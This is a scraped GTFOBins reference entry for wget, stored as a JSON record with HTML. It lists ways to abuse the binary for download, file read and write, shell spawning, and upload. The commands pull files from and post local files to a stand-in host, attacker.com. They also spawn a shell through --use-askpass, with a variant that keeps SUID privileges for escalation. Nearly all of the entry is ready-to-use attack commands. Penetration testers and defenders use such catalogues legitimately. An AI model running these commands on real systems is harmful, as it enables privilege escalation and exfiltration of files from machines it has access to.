{"title": "wget", "source": "gtfobins", "source_label": "GTFOBins", "path": "wget", "html": "<h1>wget</h1>\n<h2>Download</h2>\n<pre><code class=\"language-bash\">wget http://attacker.com/path/to/input-file -O /path/to/output-file</code></pre>\n<h2>File Read</h2>\n<p>The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.</p>\n<pre><code class=\"language-bash\">wget -i /path/to/input-file</code></pre>\n<h2>File Write</h2>\n<p>The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.</p>\n<pre><code class=\"language-bash\">wget -i /path/to/input-file -o /path/to/output-file</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">echo -e &#x27;#!/bin/sh\\n/bin/sh 1&gt;&amp;0&#x27; &gt;/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0</code></pre>\n<p><strong>SUID override:</strong></p>\n<pre><code class=\"language-bash\">echo -e &#x27;#!/bin/sh -p\\n/bin/sh -p 1&gt;&amp;0&#x27; &gt;/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0</code></pre>\n<h2>Upload</h2>\n<pre><code class=\"language-bash\">wget --post-file=/path/to/input-file http://attacker.com</code></pre>\n<pre><code class=\"language-bash\">wget --post-data=DATA http://attacker.com</code></pre>", "excerpt": "wget Download wget http://attacker.com/path/to/input-file -O /path/to/output-file File Read The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error…", "tags": ["func:download", "func:file-read", "func:file-write", "func:shell", "func:upload", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}